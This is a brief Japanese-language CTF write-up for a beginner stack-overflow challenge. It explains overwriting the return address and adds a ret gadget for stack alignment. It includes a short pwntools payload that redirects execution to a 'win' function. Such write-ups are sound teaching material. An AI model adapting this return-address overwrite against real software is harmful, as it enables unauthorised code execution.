# Beginner's Stack - Writeup
Writeup Author: ptr-yudai

## Overview
Stack Overflowがある。

## Plan
リターンアドレスを書き換える。
RSPをalignするためにret gadgetを1つ入れる。

## Exploit
次のようなデータを送れば良い。
```python
payload  = b'A' * 0x28
payload += p64(rop_ret)
payload += p64(elf.symbol('win'))
```
